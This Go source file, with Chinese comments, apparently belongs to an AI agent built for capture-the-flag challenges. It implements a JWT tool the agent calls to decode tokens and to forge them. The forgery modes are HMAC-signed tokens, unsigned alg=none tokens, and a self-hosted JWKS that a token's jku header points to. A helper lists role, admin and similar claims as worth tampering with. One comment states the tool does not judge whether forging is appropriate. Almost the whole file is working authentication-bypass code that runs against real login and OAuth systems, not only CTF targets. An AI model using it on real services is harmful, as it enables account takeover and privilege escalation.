package kernel

import (
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"sort"
	"strings"
	"time"

	"ctfagent/internal/llm"
)

// jwt 是 JWT 的通用编解码器 + 常见伪造形态生成器。
//
// 为什么值得做成工具而不是每次写一段 py：
//   - 这一类目标（登录态、OIDC/OAuth、联邦 STS）几乎每套题都有，反复出现的动作只有四个：
//     看 payload、用某个密钥签一个、试 alg=none、导出一份能被 jku 引用的 JWKS；
//   - 手写时最容易错的是 base64url 去填充、header 合并顺序、以及 HS256/384/512 选错；
//   - 工具不内置任何密钥、issuer、组名 —— 输入全是调用方从目标里读到的。
//
// 它不判断"该不该伪造"，只负责把 token 造对；是否可用由服务端响应决定。
type jwtArgs struct {
	Action  string `json:"action"`  // decode | sign | none | jwks
	Token   string `json:"token"`   // decode 用
	Payload string `json:"payload"` // sign / none 用：JSON 对象串
	Header  string `json:"header"`  // 可选：额外的 header 字段（JSON 对象串）
	Secret  string `json:"secret"`  // sign / jwks 用：HMAC 密钥（oct）
	Alg     string `json:"alg"`     // HS256（默认）/ HS384 / HS512
	Kid     string `json:"kid"`     // 可选：header.kid，jwks 里也用
	Jku     string `json:"jku"`     // 可选：header.jku（很多实现只校验前缀）
}

func b64uEncode(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }

func b64uDecode(s string) ([]byte, error) {
	if pad := len(s) % 4; pad != 0 {
		s += strings.Repeat("=", 4-pad)
	}
	return base64.URLEncoding.DecodeString(s)
}

func hmacSign(alg string, key []byte, signingInput string) ([]byte, error) {
	switch strings.ToUpper(alg) {
	case "", "HS256":
		m := hmac.New(sha256.New, key)
		m.Write([]byte(signingInput))
		return m.Sum(nil), nil
	case "HS384":
		m := hmac.New(sha512.New384, key)
		m.Write([]byte(signingInput))
		return m.Sum(nil), nil
	case "HS512":
		m := hmac.New(sha512.New, key)
		m.Write([]byte(signingInput))
		return m.Sum(nil), nil
	}
	return nil, fmt.Errorf("只支持 HS256 / HS384 / HS512 / none，收到 %q", alg)
}

func (t *ToolSet) doJWT(tc llm.ToolCall) string {
	var a jwtArgs
	if err := llm.Args(tc, &a); err != nil {
		return err.Error()
	}
	switch strings.ToLower(strings.TrimSpace(a.Action)) {
	case "", "decode":
		return jwtDecode(a.Token)
	case "sign":
		return jwtSign(a)
	case "none":
		return jwtNone(a)
	case "jwks":
		return jwtJWKS(a)
	default:
		return "action 只支持 decode / sign / none / jwks"
	}
}

func jwtDecode(tok string) string {
	parts := strings.Split(strings.TrimSpace(tok), ".")
	if len(parts) < 2 {
		return "不是 JWT：需要 header.payload[.signature] 三段"
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "段数=%d  signature=%s\n", len(parts), sigState(parts))
	for i, name := range []string{"header", "payload"} {
		if i >= len(parts) {
			break
		}
		raw, err := b64uDecode(parts[i])
		if err != nil {
			fmt.Fprintf(&sb, "%s: base64url 解码失败（%v）\n", name, err)
			continue
		}
		fmt.Fprintf(&sb, "%s(原文)=%s\n", name, raw)
		var m map[string]any
		if err := json.Unmarshal(raw, &m); err == nil {
			fmt.Fprintf(&sb, "%s(格式化)=%s\n", name, prettyJSON(m))
			if name == "payload" {
				sb.WriteString(claimHints(m))
			}
		}
	}
	return strings.TrimRight(sb.String(), "\n")
}

func sigState(parts []string) string {
	if len(parts) < 3 || strings.TrimSpace(parts[2]) == "" {
		return "空（未签名 / alg=none 形态）"
	}
	return fmt.Sprintf("%d 字节（未验签，只做展示）", len(parts[2]))
}

func prettyJSON(m map[string]any) string {
	b, err := json.Marshal(m)
	if err != nil {
		return "{}"
	}
	return string(b)
}

// claimHints 只提示"哪些字段值得拿去试"，不解释题目。
func claimHints(m map[string]any) string {
	interesting := []string{"role", "roles", "group", "groups", "scope", "scp", "admin", "is_admin",
		"username", "user", "sub", "email", "uid", "user_id", "tenant", "secret", "data", "flag"}
	var hits []string
	for k, v := range m {
		lk := strings.ToLower(k)
		for _, w := range interesting {
			if lk == w || strings.Contains(lk, w) {
				hits = append(hits, fmt.Sprintf("%s=%v", k, v))
				break
			}
		}
	}
	sort.Strings(hits)
	var sb strings.Builder
	for _, k := range []string{"exp", "iat", "nbf"} {
		if v, ok := m[k].(float64); ok {
			fmt.Fprintf(&sb, "  %s=%d → %s\n", k, int64(v), time.Unix(int64(v), 0).UTC().Format(time.RFC3339))
		}
	}
	if len(hits) > 0 {
		sb.WriteString("  值得动的字段: " + strings.Join(hits, " | ") + "\n")
	}
	return sb.String()
}

func jwtSign(a jwtArgs) string {
	secret := strings.TrimSpace(a.Secret)
	if secret == "" {
		return "sign 需要 secret（HMAC 密钥；对称密钥常来自 JWKS 的 oct.k、配置里的 SECRET_KEY）"
	}
	payload, err := jsonObject(a.Payload)
	if err != nil {
		return "payload 必须是 JSON 对象：" + err.Error()
	}
	hdr := map[string]any{"alg": strings.ToUpper(signedAlg(a.Alg)), "typ": "JWT"}
	if err := mergeJSON(hdr, a.Header); err != nil {
		return "header 必须是 JSON 对象：" + err.Error()
	}
	if a.Kid != "" {
		hdr["kid"] = a.Kid
	}
	if a.Jku != "" {
		hdr["jku"] = a.Jku
	}
	hb, _ := json.Marshal(hdr)
	pb, _ := json.Marshal(payload)
	input := b64uEncode(hb) + "." + b64uEncode(pb)
	sig, err := hmacSign(signedAlg(a.Alg), []byte(secret), input)
	if err != nil {
		return err.Error()
	}
	token := input + "." + b64uEncode(sig)
	return fmt.Sprintf("token=%s\nheader=%s\npayload=%s", token, hb, pb)
}

func jwtNone(a jwtArgs) string {
	payload, err := jsonObject(a.Payload)
	if err != nil {
		return "payload 必须是 JSON 对象：" + err.Error()
	}
	hdr := map[string]any{"alg": "none", "typ": "JWT"}
	if err := mergeJSON(hdr, a.Header); err != nil {
		return "header 必须是 JSON 对象：" + err.Error()
	}
	if a.Kid != "" {
		hdr["kid"] = a.Kid
	}
	hb, _ := json.Marshal(hdr)
	pb, _ := json.Marshal(payload)
	// 两种常见变体一起给：签名段为空 / 只留一个点
	return fmt.Sprintf("token=%s.%s.\ntoken_alt=%s.%s\nheader=%s\npayload=%s",
		b64uEncode(hb), b64uEncode(pb), b64uEncode(hb), b64uEncode(pb), hb, pb)
}

func jwtJWKS(a jwtArgs) string {
	secret := strings.TrimSpace(a.Secret)
	if secret == "" {
		return "jwks 需要 secret（把它作为 oct 对称密钥发布）"
	}
	kid := a.Kid
	if strings.TrimSpace(kid) == "" {
		kid = "k1"
	}
	jwks := map[string]any{"keys": []any{map[string]any{
		"kty": "oct",
		"kid": kid,
		"k":   b64uEncode([]byte(secret)),
	}}}
	b, _ := json.Marshal(jwks)
	var sb strings.Builder
	fmt.Fprintf(&sb, "jwks=%s\n", b)
	fmt.Fprintf(&sb, "kid=%s\n", kid)
	fmt.Fprintf(&sb, "提示: 把这段 JSON 存成文件挂到目标能匿名读的路径，再让 token 的 header 用 {\"kid\":%q,\"jku\":\"<该路径>\"} 指向它。", kid)
	return sb.String()
}

func signedAlg(s string) string {
	s = strings.ToUpper(strings.TrimSpace(s))
	if s == "" {
		return "HS256"
	}
	return s
}

func jsonObject(s string) (map[string]any, error) {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil, fmt.Errorf("为空")
	}
	var m map[string]any
	if err := json.Unmarshal([]byte(s), &m); err != nil {
		return nil, err
	}
	return m, nil
}

func mergeJSON(dst map[string]any, extra string) error {
	if strings.TrimSpace(extra) == "" {
		return nil
	}
	src, err := jsonObject(extra)
	if err != nil {
		return err
	}
	for k, v := range src {
		dst[k] = v
	}
	return nil
}
